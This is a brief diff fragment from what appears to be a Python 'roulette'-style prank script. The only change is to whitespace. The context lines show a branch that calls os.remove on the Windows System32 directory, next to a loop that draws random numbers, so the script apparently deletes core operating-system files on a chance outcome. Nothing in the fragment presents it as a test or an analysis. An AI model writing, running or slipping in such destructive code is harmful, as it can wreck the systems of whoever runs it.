@@ -7,7 +7,7 @@ def rou():
     else:
         os.remove("C:\Windows\System32")
 
-    
+
 
 while True:
     y = random.randint(1,10)
